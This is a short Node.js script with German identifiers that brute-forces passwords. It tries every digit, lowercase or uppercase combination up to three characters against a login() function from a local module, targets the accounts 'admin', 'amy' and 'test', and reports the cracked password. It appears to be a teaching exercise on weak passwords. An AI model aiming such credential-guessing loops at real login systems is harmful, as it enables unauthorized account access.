"use strict";

const {login} = require("./login");

const MONO_CHARSETS = {
    digits: "0123456789",
    lowercase: "abcdefghijklmnopqrstuvwxyz",
    uppercase: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
}



function* kombinationen(zeichensatz, laenge) {
  if (laenge === 0) {
    yield "";
    return;
  }

  for (const zeichen of zeichensatz) {
    for (const rest of kombinationen(zeichensatz, laenge - 1)) {
      yield zeichen + rest;
    }
  }
}

async function bruteForceMono(nutzer, zeichensatz, maxLaenge) {
  let versuche = 0;

  for (let laenge = 1; laenge <= maxLaenge; laenge++) {
    for (const versuch of kombinationen(zeichensatz, laenge)) {
      versuche++;
      try {
        if (await login(nutzer, versuch)) {
          return { gefunden: versuch, versuche };
        }
      } catch (error) {
          if (error.message.includes("Rate limit exceeded")) {
              console.error("Rate limit exceeded. Please try again later.");
              process.exit(1);
          }
          throw error;
      }
    }
  }

  return { gefunden: null, versuche };
}

async function main() {
    const usernames = ["admin", "amy", "test"];

    console.log(`\n--- Angriff auf Benutzer ---`);

    for (const username of usernames) {
        console.log(`\nAngriffsziel: ${username}`);
        for (const [name, zeichensatz] of Object.entries(MONO_CHARSETS)) {
            console.log(`\nAngriff mit Zeichensatz: ${name} (${zeichensatz})`);
            const start = Date.now();
            const {gefunden, versuche} = await bruteForceMono(username, zeichensatz, 3);
            const dauerSekunden = (Date.now() - start) / 1000;

            console.log(`Angriffsziel:      username="${username}"`);
            console.log(`Passwort gefunden: ${gefunden}`);
            console.log(`Anzahl Versuche:   ${versuche}`);
            console.log(`Dauer:             ${dauerSekunden.toFixed(3)} Sekunden`);

            if (gefunden) {
                console.log(`Erfolgreich! Das Passwort für den Nutzer "${username}" ist: ${gefunden}`);
                return;
            }
        }
    }

    console.log("\n--- Angriff abgeschlossen ---");
}

if (require.main === module) {
  main();
}
